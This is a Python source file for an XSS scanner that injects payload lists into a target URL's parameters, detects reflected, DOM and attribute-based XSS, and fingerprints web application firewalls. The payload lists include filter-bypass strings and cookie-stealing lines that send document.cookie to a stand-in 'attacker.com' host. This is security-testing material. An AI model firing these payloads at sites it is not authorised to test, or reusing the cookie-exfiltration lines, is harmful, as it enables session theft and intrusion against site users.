"""
BYMA TOOLS - Advanced XSS Scanner
Professional Cross-Site Scripting detection with multiple techniques
"""
import requests
import re
import time
import json
import hashlib
import urllib.parse
from pathlib import Path
from datetime import datetime
from core.colors import (
    print_success, print_error, print_warning, print_info,
    print_result, print_section, print_subsection, print_table,
    cprint, Colors, print_separator, Icons, print_vuln_found
)
from core.logger import get_logger
from core.database import get_database


class XSSScanner:
    """Professional XSS scanner with comprehensive detection"""
    
    def __init__(self):
        self.logger = get_logger()
        self.db = get_database()
        self.vulnerabilities = []
        self.tested_params = 0
        self.target_url = None
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
    
    # XSS Payloads organized by context
    PAYLOADS = {
        'reflected_basic': [
            '<script>alert("XSS")</script>',
            '<script>alert(document.domain)</script>',
            '<script>alert(window.location)</script>',
            '<script>alert(document.cookie)</script>',
            '<img src=x onerror=alert("XSS")>',
            '<img src=x onerror=alert(document.domain)>',
            '<svg onload=alert("XSS")>',
            '<svg onload=alert(document.domain)>',
            '<body onload=alert("XSS")>',
            '<iframe src=javascript:alert("XSS")>',
            '<input onfocus=alert("XSS") autofocus>',
            '<select autofocus onfocus=alert("XSS")>',
            '<textarea autofocus onfocus=alert("XSS")>',
            '<keygen autofocus onfocus=alert("XSS")>',
            '<video><source onerror=alert("XSS")>',
            '<audio src=x onerror=alert("XSS")>',
            '<details open ontoggle=alert("XSS")>',
            '<marquee onstart=alert("XSS")>',
            '<object data=javascript:alert("XSS")>',
            '<embed src=javascript:alert("XSS")>',
        ],
        
        'reflected_encoded': [
            '"><script>alert("XSS")</script>',
            "'>alert('XSS')",
            '"><img src=x onerror=alert("XSS")>',
            "'><svg onload=alert('XSS')>",
            '"><body onload=alert("XSS")>',
            '"><iframe src=javascript:alert("XSS")>',
            'javascript:alert("XSS")',
            'data:text/html,<script>alert("XSS")</script>',
            '%3Cscript%3Ealert(%22XSS%22)%3C/script%3E',
            '%22%3E%3Cscript%3Ealert(%22XSS%22)%3C/script%3E',
            '%3Cimg%20src%3Dx%20onerror%3Dalert(%22XSS%22)%3E',
            '%3Csvg%20onload%3Dalert(%22XSS%22)%3E',
            '&lt;script&gt;alert("XSS")&lt;/script&gt;',
            '&#60;script&#62;alert("XSS")&#60;/script&#62;',
            '&#x3C;script&#x3E;alert("XSS")&#x3C;/script&#x3E;',
        ],
        
        'reflected_polymorphic': [
            '<scr<script>ipt>alert("XSS")</scr</script>ipt>',
            '<scr\x00ipt>alert("XSS")</scr\x00ipt>',
            '<script>alert(String.fromCharCode(88,83,83))</script>',
            '<script>eval(atob("YWxlcnQoIlhTUyIp"))</script>',
            '<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>',
            '<script>fetch("http://attacker.com/"+document.cookie)</script>',
            '<script>navigator.sendBeacon("http://attacker.com/",document.cookie)</script>',
            '<script>new Image().src="http://attacker.com/?c="+document.cookie</script>',
            '<svg/onload=fetch("http://attacker.com/?c="+document.cookie)>',
            '<img src=x onerror="eval(atob(\\'YWxlcnQoJ3hzcycp\\'))">',
        ],
        
        'stored_xss': [
            '<script>alert("Stored XSS")</script>',
            '<img src=x onerror=alert("Stored XSS")>',
            '<svg onload=alert("Stored XSS")>',
            '<body onload=alert("Stored XSS")>',
            '<input onfocus=alert("Stored XSS") autofocus>',
            '<details open ontoggle=alert("Stored XSS")>',
            '<marquee onstart=alert("Stored XSS")>',
            '<video><source onerror=alert("Stored XSS")>',
            '<audio src=x onerror=alert("Stored XSS")>',
            '<object data=javascript:alert("Stored XSS")>',
        ],
        
        'dom_xss': [
            '#<script>alert("DOM XSS")</script>',
            '#<img src=x onerror=alert("DOM XSS")>',
            '#<svg onload=alert("DOM XSS")>',
            '#javascript:alert("DOM XSS")',
            '#data:text/html,<script>alert("DOM XSS")</script>',
            '#"><script>alert("DOM XSS")</script>',
            "#'><script>alert('DOM XSS')</script>",
        ],
        
        'event_handler': [
            '" onmouseover="alert("XSS")"',
            "' onmouseover='alert(\"XSS\")'",
            '" onfocus="alert("XSS")"',
            "' onfocus='alert(\"XSS\")'",
            '" onclick="alert("XSS")"',
            "' onclick='alert(\"XSS\")'",
            '" ondblclick="alert("XSS")"',
            "' ondblclick='alert(\"XSS\")'",
            '" onkeydown="alert("XSS")"',
            "' onkeydown='alert(\"XSS\")"',
            '" onkeypress="alert("XSS")"',
            "' onkeypress='alert(\"XSS\")'",
            '" onkeyup="alert("XSS")"',
            "' onkeyup='alert(\"XSS\")'",
            '" onload="alert("XSS")"',
            "' onload='alert(\"XSS\")'",
            '" onerror="alert("XSS")"',
            "' onerror='alert(\"XSS\")'",
            '" oninput="alert("XSS")"',
            "' oninput='alert(\"XSS\")'",
            '" onchange="alert("XSS")"',
            "' onchange='alert(\"XSS\")'",
            '" onsubmit="alert("XSS")"',
            "' onsubmit='alert(\"XSS\")'",
            '" onreset="alert("XSS")"',
            "' onreset='alert(\"XSS\")'",
            '" onselect="alert("XSS")"',
            "' onselect='alert(\"XSS\")'",
            '" onresize="alert("XSS")"',
            "' onresize='alert(\"XSS\")'",
            '" onabort="alert("XSS")"',
            "' onabort='alert(\"XSS\")'",
        ],
        
        'attribute_breakout': [
            '" onmouseover=alert("XSS") ',
            "' onmouseover='alert(\"XSS\")' ",
            '" onfocus=alert("XSS") autofocus="',
            "' onfocus='alert(\"XSS\")' autofocus='",
            '" onclick=alert("XSS") ',
            "' onclick='alert(\"XSS\")' ",
            '" ondblclick=alert("XSS") ',
            "' ondblclick='alert(\"XSS\")' ",
            '" onkeydown=alert("XSS") ',
            "' onkeydown='alert(\"XSS\")' ",
            '" onkeyup=alert("XSS") ',
            "' onkeyup='alert(\"XSS\")' ",
        ],
        
        'javascript_protocol': [
            'javascript:alert("XSS")',
            'javascript:alert(document.domain)',
            'javascript:alert(document.cookie)',
            'javascript:alert(window.location)',
            'javascript:alert(document.title)',
            'javascript:void(alert("XSS"))',
            'javascript:eval(alert("XSS"))',
            'javascript:window.location="http://attacker.com"',
            'data:text/html,<script>alert("XSS")</script>',
            'data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4=',
        ],
        
        'filter_bypass': [
            '<script>alert(String.fromCharCode(88,83,83))</script>',
            '<script>eval(atob("YWxlcnQoIlhTUyIp"))</script>',
            '<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">',
            '<svg onload="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">',
            '<body onload="eval(atob(\\'YWxlcnQoJ3hzcycp\\'))">',
            '<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>',
            '<scr\x00ipt>alert("XSS")</scr\x00ipt>',
            '<script>alarm(1)</script>',
            '<script>prompt(1)</script>',
            '<script>confirm(1)</script>',
            '<script>alert`1`</script>',
            '<script>alert(1)</script>',
            '<script>alert(1)</script>',
        ],
        
        'csp_bypass': [
            '<script>alert("XSS")</script>',
            '<script src="//attacker.com/xss.js"></script>',
            '<script src="data:text/javascript,alert(1)"></script>',
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            '<iframe src="data:text/html,<script>alert(1)</script>">',
            '<object data="data:text/html,<script>alert(1)</script>">',
            '<embed src="data:text/html,<script>alert(1)</script>">',
        ],
    }
    
    # WAF Detection patterns
    WAF_PATTERNS = [
        (r'Access Denied', 'Generic WAF'),
        (r'403 Forbidden', 'Generic WAF'),
        (r'Blocked', 'Generic WAF'),
        (r'WAF', 'Generic WAF'),
        (r'Web Application Firewall', 'Generic WAF'),
        (r'Incapsula', 'Incapsula'),
        (r'imperva', 'Imperva'),
        (r'cloudflare', 'Cloudflare'),
        (r'akamai', 'Akamai'),
        (r'sucuri', 'Sucuri'),
        (r'wordfence', 'Wordfence'),
        (r'mod_security', 'ModSecurity'),
        (r'BigIP', 'F5 BIG-IP'),
        (r'F5', 'F5 BIG-IP'),
        (r'Citrix', 'Citrix NetScaler'),
        (r' Barracuda', 'Barracuda'),
        (r'FortiWeb', 'Fortinet'),
        (r'Denial', 'Generic WAF'),
    ]
    
    def scan(self, url, threads=10, timeout=10, output=None, mode='comprehensive'):
        """Main XSS scan function"""
        self.target_url = url
        self.start_time = datetime.now()
        
        print_section(f"XSS SCANNER")
        print()
        
        # Create scan record
        scan_id = self.db.create_scan("xss_scan", url, "vulnerability")
        self.logger.scan_start("xss_scan", url)
        
        try:
            # Parse URL and parameters
            parsed_url = urllib.parse.urlparse(url)
            params = urllib.parse.parse_qs(parsed_url.query)
            
            if not params:
                print_warning("No parameters found in URL")
                print_info("Testing path-based injection...")
                params = {'path': [parsed_url.path]}
            
            print(f"  {Icons.TARGET} {Colors.BCYAN}Target:{Colors.BWHITE}       {url}")
            print(f"  {Icons.INFO} {Colors.BCYAN}Parameters:{Colors.BWHITE}   {len(params)}")
            print(f"  {Icons.INFO} {Colors.BCYAN}Mode:{Colors.BWHITE}         {mode.upper()}")
            print(f"  {Icons.INFO} {Colors.BCYAN}Timeout:{Colors.BWHITE}      {timeout}s")
            print_separator("-", 50)
            print()
            
            # Test each parameter
            for param_name, param_values in params.items():
                param_value = param_values[0] if param_values else ''
                
                print_subsection(f"Testing Parameter: {param_name}")
                
                # Get baseline response
                baseline = self._get_baseline_response(url, param_name, param_value)
                
                if not baseline:
                    print_warning("Could not get baseline response")
                    continue
                
                # Test reflected XSS
                print_info("Testing reflected XSS...")
                self._test_reflected_xss(url, param_name, param_value, baseline, timeout)
                
                # Test DOM-based XSS
                print_info("Testing DOM-based XSS...")
                self._test_dom_xss(url, param_name, param_value, baseline, timeout)
                
                # Test event handler XSS
                print_info("Testing event handler XSS...")
                self._test_event_handler_xss(url, param_name, param_value, baseline, timeout)
                
                # Test attribute breakout
                print_info("Testing attribute breakout...")
                self._test_attribute_breakout(url, param_name, param_value, baseline, timeout)
                
                # Test filter bypass
                if mode == 'comprehensive':
                    print_info("Testing filter bypass techniques...")
                    self._test_filter_bypass(url, param_name, param_value, baseline, timeout)
                
                self.tested_params += 1
            
            # Check for WAF
            print_subsection("WAF Detection")
            self._detect_waf()
            
            # Display results
            self._display_results()
            
            # Save to database
            self._save_to_database(scan_id)
            
            # Update scan status
            self.db.update_scan(scan_id, "completed", len(self.vulnerabilities))
            self.logger.scan_complete("xss_scan", url, len(self.vulnerabilities))
            
            # Save to file if requested
            if output:
                self._save_results(output)
            
            return self.vulnerabilities
        
        except Exception as e:
            self.db.update_scan(scan_id, "failed")
            self.logger.scan_error("xss_scan", url, str(e))
            print_error(f"Scan failed: {e}")
            return []
    
    def _get_baseline_response(self, url, param_name, param_value):
        """Get baseline response for comparison"""
        try:
            normal_url = url.replace(f"{param_name}={param_value}", f"{param_name}=baseline_test")
            response = self.session.get(normal_url, timeout=10, verify=False)
            
            return {
                'status': response.status_code,
                'length': len(response.text),
                'text': response.text,
                'hash': hashlib.md5(response.text.encode()).hexdigest(),
                'headers': dict(response.headers),
            }
        except Exception:
            return None
    
    def _test_reflected_xss(self, url, param_name, param_value, baseline, timeout):
        """Test for reflected XSS"""
        for payload in self.PAYLOADS['reflected_basic'] + self.PAYLOADS['reflected_encoded']:
            try:
                test_url = url.replace(f"{param_name}={param_value}", f"{param_name}={urllib.parse.quote(payload)}")
                response = self.session.get(test_url, timeout=timeout, verify=False)
                
                # Check if payload is reflected
                if self._is_payload_reflected(payload, response.text):
                    # Check if payload is executed (not filtered)
                    if self._is_payload_executable(payload, response.text):
                        self.vulnerabilities.append({
                            'type': 'Reflected XSS',
                            'parameter': param_name,
                            'payload': payload,
                            'context': 'HTML',
                            'evidence': self._extract_evidence(payload, response.text),
                            'severity': 'HIGH',
                            'status': response.status_code,
                            'response_length': len(response.text),
                        })
                        print_vuln_found("Reflected XSS", "HIGH", param_name)
                        return True
            except:
                pass
        
        return False
    
    def _test_dom_xss(self, url, param_name, param_value, baseline, timeout):
        """Test for DOM-based XSS"""
        for payload in self.PAYLOADS['dom_xss']:
            try:
                test_url = url.replace(f"{param_name}={param_value}", f"{param_name}={urllib.parse.quote(payload)}")
                response = self.session.get(test_url, timeout=timeout, verify=False)
                
                # Check for DOM sinks
                dom_sinks = [
                    r'document\.write',
                    r'document\.writeln',
                    r'innerHTML',
                    r'outerHTML',
                    r'eval\(',
                    r'setTimeout\(',
                    r'setInterval\(',
                    r'location\.href',
                    r'location\.assign',
                    r'location\.replace',
                    r'window\.open',
                ]
                
                for sink in dom_sinks:
                    if re.search(sink, response.text, re.IGNORECASE):
                        # Check if our payload reaches the sink
                        if self._is_payload_in_dom(payload, response.text):
                            self.vulnerabilities.append({
                                'type': 'DOM-based XSS',
                                'parameter': param_name,
                                'payload': payload,
                                'context': 'DOM',
                                'evidence': f"Payload reaches {sink}",
                                'severity': 'HIGH',
                                'status': response.status_code,
                                'response_length': len(response.text),
                            })
                            print_vuln_found("DOM-based XSS", "HIGH", param_name)
                            return True
            except:
                pass
        
        return False
    
    def _test_event_handler_xss(self, url, param_name, param_value, baseline, timeout):
        """Test for event handler XSS"""
        for payload in self.PAYLOADS['event_handler']:
            try:
                test_url = url.replace(f"{param_name}={param_value}", f"{param_name}={urllib.parse.quote(payload)}")
                response = self.session.get(test_url, timeout=timeout, verify=False)
                
                if self._is_payload_reflected(payload, response.text):
                    if self._is_payload_executable(payload, response.text):
                        self.vulnerabilities.append({
                            'type': 'Event Handler XSS',
                            'parameter': param_name,
                            'payload': payload,
                            'context': 'Attribute',
                            'evidence': self._extract_evidence(payload, response.text),
                            'severity': 'HIGH',
                            'status': response.status_code,
                            'response_length': len(response.text),
                        })
                        print_vuln_found("Event Handler XSS", "HIGH", param_name)
                        return True
            except:
                pass
        
        return False
    
    def _test_attribute_breakout(self, url, param_name, param_value, baseline, timeout):
        """Test for attribute breakout XSS"""
        for payload in self.PAYLOADS['attribute_breakout']:
            try:
                test_url = url.replace(f"{param_name}={param_value}", f"{param_name}={urllib.parse.quote(payload)}")
                response = self.session.get(test_url, timeout=timeout, verify=False)
                
                if self._is_payload_reflected(payload, response.text):
                    if self._is_payload_executable(payload, response.text):
                        self.vulnerabilities.append({
                            'type': 'Attribute Breakout XSS',
                            'parameter': param_name,
                            'payload': payload,
                            'context': 'Attribute',
                            'evidence': self._extract_evidence(payload, response.text),
                            'severity': 'HIGH',
                            'status': response.status_code,
                            'response_length': len(response.text),
                        })
                        print_vuln_found("Attribute Breakout XSS", "HIGH", param_name)
                        return True
            except:
                pass
        
        return False
    
    def _test_filter_bypass(self, url, param_name, param_value, baseline, timeout):
        """Test for filter bypass XSS"""
        for payload in self.PAYLOADS['filter_bypass']:
            try:
                test_url = url.replace(f"{param_name}={param_value}", f"{param_name}={urllib.parse.quote(payload)}")
                response = self.session.get(test_url, timeout=timeout, verify=False)
                
                if self._is_payload_reflected(payload, response.text):
                    if self._is_payload_executable(payload, response.text):
                        self.vulnerabilities.append({
                            'type': 'Filter Bypass XSS',
                            'parameter': param_name,
                            'payload': payload,
                            'context': 'Filtered',
                            'evidence': self._extract_evidence(payload, response.text),
                            'severity': 'CRITICAL',
                            'status': response.status_code,
                            'response_length': len(response.text),
                        })
                        print_vuln_found("Filter Bypass XSS", "CRITICAL", param_name)
                        return True
            except:
                pass
        
        return False
    
    def _is_payload_reflected(self, payload, response_text):
        """Check if payload is reflected in response"""
        # Check for exact reflection
        if payload in response_text:
            return True
        
        # Check for encoded reflection
        encoded = urllib.parse.quote(payload)
        if encoded in response_text:
            return True
        
        # Check for HTML encoded reflection
        html_encoded = payload.replace('<', '&lt;').replace('>', '&gt;')
        if html_encoded in response_text:
            return False  # It's encoded, not vulnerable
        
        return False
    
    def _is_payload_executable(self, payload, response_text):
        """Check if payload is executable (not filtered)"""
        # Check if script tags are present
        if '<script>' in payload.lower():
            if '<script>' not in response_text.lower():
                return False
        
        # Check if event handlers are present
        event_handlers = ['onerror', 'onload', 'onmouseover', 'onfocus', 'onclick']
        for handler in event_handlers:
            if handler in payload.lower():
                if handler not in response_text.lower():
                    return False
        
        # Check if javascript: protocol is present
        if 'javascript:' in payload.lower():
            if 'javascript:' not in response_text.lower():
                return False
        
        return True
    
    def _is_payload_in_dom(self, payload, response_text):
        """Check if payload is in DOM"""
        # Simple check - look for payload in script tags
        script_tags = re.findall(r'<script[^>]*>(.*?)</script>', response_text, re.IGNORECASE | re.DOTALL)
        
        for script in script_tags:
            if payload in script:
                return True
        
        return False
    
    def _extract_evidence(self, payload, response_text):
        """Extract evidence of vulnerability"""
        # Find context where payload appears
        idx = response_text.find(payload)
        if idx != -1:
            start = max(0, idx - 50)
            end = min(len(response_text), idx + len(payload) + 50)
            return response_text[start:end]
        
        return "Payload reflected in response"
    
    def _detect_waf(self):
        """Detect Web Application Firewall"""
        try:
            response = self.session.get(self.target_url, timeout=10, verify=False)
            
            waf_detected = []
            
            # Check response headers
            for header, value in response.headers.items():
                header_lower = header.lower()
                value_lower = value.lower()
                
                if 'x-sucuri-id' in header_lower:
                    waf_detected.append('Sucuri')
                elif 'cf-ray' in header_lower:
                    waf_detected.append('Cloudflare')
                elif 'x-akamai' in header_lower:
                    waf_detected.append('Akamai')
                elif 'x-azure' in header_lower:
                    waf_detected.append('Azure WAF')
                elif 'x-cdn' in header_lower:
                    waf_detected.append('CDN')
            
            # Check response body
            for pattern, waf_name in self.WAF_PATTERNS:
                if re.search(pattern, response.text, re.IGNORECASE):
                    if waf_name not in waf_detected:
                        waf_detected.append(waf_name)
            
            if waf_detected:
                print_warning(f"WAF Detected: {', '.join(waf_detected)}")
            else:
                print_success("No WAF detected")
                
        except Exception as e:
            print_warning(f"WAF detection failed: {e}")
    
    def _display_results(self):
        """Display scan results"""
        print_section("XSS SCAN RESULTS")
        
        if not self.vulnerabilities:
            print_success("No XSS vulnerabilities found")
            print_info(f"Tested {self.tested_params} parameters")
            return
        
        # Summary
        elapsed = (datetime.now() - self.start_time).total_seconds()
        
        print(f"\n  {Icons.WARNING} {Colors.BRED}VULNERABILITIES FOUND{Colors.RESET}")
        print_separator("-", 50)
        
        print(f"  {Icons.TARGET} {Colors.BCYAN}Target:{Colors.BWHITE}       {self.target_url}")
        print(f"  {Icons.INFO} {Colors.BCYAN}Vulnerabilities:{Colors.BWHITE} {len(self.vulnerabilities)}")
        print(f"  {Icons.INFO} {Colors.BCYAN}Parameters Tested:{Colors.BWHITE} {self.tested_params}")
        print(f"  {Icons.INFO} {Colors.BCYAN}Time:{Colors.BWHITE}         {elapsed:.1f}s")
        
        print_separator("-", 50)
        print()
        
        # Display each vulnerability
        for i, vuln in enumerate(self.vulnerabilities, 1):
            severity_colors = {
                'CRITICAL': Colors.BRED,
                'HIGH': Colors.RED,
                'MEDIUM': Colors.BYELLOW,
                'LOW': Colors.BCYAN,
            }
            severity_color = severity_colors.get(vuln['severity'], Colors.BWHITE)
            
            print_subsection(f"Vulnerability #{i}")
            print(f"  {Colors.BCYAN}Type:{Colors.BWHITE}       {vuln['type']}")
            print(f"  {Colors.BCYAN}Parameter:{Colors.BWHITE}   {vuln['parameter']}")
            print(f"  {Colors.BCYAN}Severity:{Colors.BWHITE}    {severity_color}{vuln['severity']}")
            print(f"  {Colors.BCYAN}Context:{Colors.BWHITE}     {vuln['context']}")
            print(f"  {Colors.BCYAN}Payload:{Colors.BWHITE}     {vuln['payload'][:80]}...")
            print(f"  {Colors.BCYAN}Evidence:{Colors.BWHITE}    {vuln['evidence'][:80]}...")
            print(f"  {Colors.BCYAN}Status:{Colors.BWHITE}      {vuln['status']}")
            print()
    
    def _save_to_database(self, scan_id):
        """Save vulnerabilities to database"""
        try:
            with self.db._cursor() as cursor:
                for vuln in self.vulnerabilities:
                    cursor.execute("""
                        INSERT INTO vulnerabilities 
                        (scan_id, vuln_type, severity, location, evidence, payload)
                        VALUES (?, ?, ?, ?, ?, ?)
                    """, (
                        scan_id,
                        vuln['type'],
                        vuln['severity'],
                        f"{self.target_url}?{vuln['parameter']}",
                        vuln['evidence'],
                        vuln['payload']
                    ))
        except Exception as e:
            print_warning(f"Could not save to database: {e}")
    
    def _save_results(self, output_file):
        """Save results to JSON file"""
        try:
            output_path = Path(output_file)
            output_path.parent.mkdir(parents=True, exist_ok=True)
            
            results = {
                'target': self.target_url,
                'scan_time': self.start_time.isoformat(),
                'total_vulnerabilities': len(self.vulnerabilities),
                'parameters_tested': self.tested_params,
                'vulnerabilities': self.vulnerabilities
            }
            
            with open(output_path, 'w') as f:
                json.dump(results, f, indent=2)
            
            print_success(f"Results saved to {output_file}")
        except Exception as e:
            print_error(f"Failed to save results: {e}")
